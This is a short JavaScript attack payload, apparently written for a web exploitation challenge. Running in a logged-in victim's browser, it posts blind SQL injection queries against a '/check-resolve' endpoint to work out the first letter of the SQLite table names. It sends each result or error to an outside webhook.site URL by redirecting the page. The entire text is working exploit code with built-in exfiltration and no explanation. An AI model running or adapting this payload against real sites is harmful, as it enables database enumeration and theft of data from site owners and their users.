(async()=>{
  try{
    const hook='https://webhook.site/aef63664-4b2b-4a25-a695-c21c1fdd7a89/';
    const chars='abcdefghijklmnopqrstuvwxyz_';
    for(const c of chars){
      const body=new URLSearchParams();
      body.append(
        'id',
        `CASE WHEN substr((SELECT group_concat(name,'|') FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%'),1,1)='${c}' THEN 6 ELSE 7 END`
      );

      const r=await fetch('/check-resolve',{
        method:'POST',
        headers:{'Content-Type':'application/x-www-form-urlencoded'},
        body,
        credentials:'include'
      });

      const t=await r.text();
      if(t.includes('Not yet')){
        location=hook+'?d='+encodeURIComponent('user_first_char='+c);
        return;
      }
    }
    location=hook+'?d=user_first_char_not_found';
  }catch(e){
    location='https://webhook.site/aef63664-4b2b-4a25-a695-c21c1fdd7a89/?err='+encodeURIComponent(e.toString());
  }
})();